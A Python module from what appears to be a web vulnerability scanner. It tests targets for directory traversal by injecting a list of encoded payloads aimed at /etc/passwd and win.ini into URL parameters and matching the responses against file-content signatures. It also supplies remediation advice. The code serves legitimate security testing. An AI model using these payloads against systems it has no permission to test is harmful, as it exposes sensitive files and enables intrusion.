"""
Directory Traversal Check

Tests for path traversal vulnerabilities.
"""

import re
import time
from typing import Dict, Any, List
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

from atlas.checks.base import (
    VulnerabilityCheck, CheckMetadata, CheckResult, CheckStatus, Severity
)
from atlas.utils.logger import get_logger

logger = get_logger(__name__)


class DirectoryTraversalCheck(VulnerabilityCheck):
    """
    Directory/Path Traversal vulnerability check.
    
    Tests for file inclusion and path manipulation vulnerabilities.
    """
    
    @property
    def metadata(self) -> CheckMetadata:
        return CheckMetadata(
            id="directory_traversal",
            name="Directory Traversal",
            category="File Inclusion",
            severity=Severity.HIGH,
            description="Tests for path traversal vulnerabilities that could expose sensitive files",
            owasp_category="A01:2021 Broken Access Control",
            cwe_id="CWE-22",
            prerequisites=[],
            applicable_services=["http", "https", "http-alt"],
            tags=["lfi", "path-traversal", "file-inclusion"]
        )
    
    # Traversal payloads
    PAYLOADS = [
        # Unix
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..//..//..//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "....\/....\/....\/etc/passwd",
        
        # Windows
        "..\\..\\..\\windows\\win.ini",
        "....\\\\....\\\\....\\\\windows\\win.ini",
        "..%5c..%5c..%5cwindows\\win.ini",
        
        # Null byte (legacy)
        "../../../etc/passwd%00",
        "../../../etc/passwd\x00.jpg",
    ]
    
    # File signatures
    FILE_SIGNATURES = {
        "/etc/passwd": [
            r"root:.*:0:0:",
            r"[a-z_][a-z0-9_-]*:[x\*]:[\d]+:[\d]+:",
        ],
        "win.ini": [
            r"\[fonts\]",
            r"\[extensions\]",
            r"\[mci extensions\]",
        ]
    }
    
    # Common vulnerable parameters
    VULNERABLE_PARAMS = [
        "file", "path", "page", "document", "folder", "root",
        "pg", "style", "pdf", "template", "php_path", "doc",
        "include", "inc", "locate", "show", "site", "type",
        "view", "content", "layout", "mod", "conf", "url"
    ]
    
    async def execute(self, target: str, context: Dict[str, Any]) -> CheckResult:
        """Execute directory traversal check"""
        import httpx
        
        start_time = time.time()
        
        try:
            async with httpx.AsyncClient(timeout=15, verify=False, follow_redirects=True) as client:
                vulnerable_points = []
                
                # Test existing URL parameters
                param_results = await self._test_url_params(client, target)
                vulnerable_points.extend(param_results)
                
                # Test common file parameters
                common_results = await self._test_common_params(client, target)
                vulnerable_points.extend(common_results)
                
                execution_time = time.time() - start_time
                
                if vulnerable_points:
                    return self._vulnerable(
                        title="Directory Traversal Vulnerability Detected",
                        description=f"Found {len(vulnerable_points)} path traversal vulnerability point(s)",
                        evidence=self._format_evidence(vulnerable_points),
                        remediation=self._get_remediation(),
                        url=target,
                        parameter=vulnerable_points[0].get("parameter"),
                        payload=vulnerable_points[0].get("payload"),
                        cvss_score=7.5,
                        execution_time=execution_time
                    )
                else:
                    return self._not_vulnerable(
                        description="No directory traversal vulnerabilities detected",
                        execution_time=execution_time
                    )
                    
        except Exception as e:
            logger.error(f"Directory traversal check error: {e}")
            return self._error(str(e))
    
    async def _test_url_params(self, client, target: str) -> List[Dict]:
        """Test existing URL parameters"""
        vulnerable = []
        parsed = urlparse(target)
        params = parse_qs(parsed.query)
        
        # Filter to likely file parameters
        file_params = {
            k: v for k, v in params.items()
            if any(fp in k.lower() for fp in self.VULNERABLE_PARAMS)
            or any(ext in str(v).lower() for ext in ['.php', '.html', '.txt', '.inc', '.log'])
        }
        
        for param_name in file_params.keys():
            for payload in self.PAYLOADS[:8]:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                
                try:
                    response = await client.get(test_url)
                    
                    file_content = self._detect_file_content(response.text)
                    if file_content:
                        vulnerable.append({
                            "type": "url_parameter",
                            "parameter": param_name,
                            "payload": payload,
                            "evidence": file_content,
                            "url": test_url
                        })
                        break
                        
                except Exception:
                    continue
        
        return vulnerable
    
    async def _test_common_params(self, client, target: str) -> List[Dict]:
        """Test common file-related parameters"""
        vulnerable = []
        parsed = urlparse(target)
        existing_params = parse_qs(parsed.query)
        
        # Test subset of common params
        params_to_test = self.VULNERABLE_PARAMS[:8]
        
        for param_name in params_to_test:
            if param_name in existing_params:
                continue  # Already tested
            
            for payload in self.PAYLOADS[:4]:  # Limit payloads
                test_params = existing_params.copy()
                test_params[param_name] = [payload]
                
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                
                try:
                    response = await client.get(test_url)
                    
                    file_content = self._detect_file_content(response.text)
                    if file_content:
                        vulnerable.append({
                            "type": "injected_parameter",
                            "parameter": param_name,
                            "payload": payload,
                            "evidence": file_content,
                            "url": test_url
                        })
                        break
                        
                except Exception:
                    continue
        
        return vulnerable
    
    def _detect_file_content(self, text: str) -> str:
        """Detect if response contains file contents"""
        for file_name, patterns in self.FILE_SIGNATURES.items():
            for pattern in patterns:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    # Extract context
                    start = max(0, match.start() - 20)
                    end = min(len(text), match.end() + 80)
                    return f"File detected ({file_name}): {text[start:end]}"
        
        return None
    
    def _format_evidence(self, points: List[Dict]) -> str:
        """Format vulnerability evidence"""
        lines = []
        for i, point in enumerate(points, 1):
            lines.append(f"{i}. {point['type']}: {point['parameter']}")
            lines.append(f"   Payload: {point['payload']}")
            lines.append(f"   Evidence: {point['evidence'][:150]}")
        return "\n".join(lines)
    
    def _get_remediation(self) -> str:
        """Get remediation guidance"""
        return """
1. Never use user input directly in file system operations
2. Implement strict allowlist validation for file names
3. Use basename() to strip directory components
4. Chroot or containerize file access
5. Remove null bytes and encoded traversal sequences
6. Validate file paths remain within allowed directories
7. Use framework-provided secure file access methods
8. Implement proper access controls on sensitive files
        """.strip()
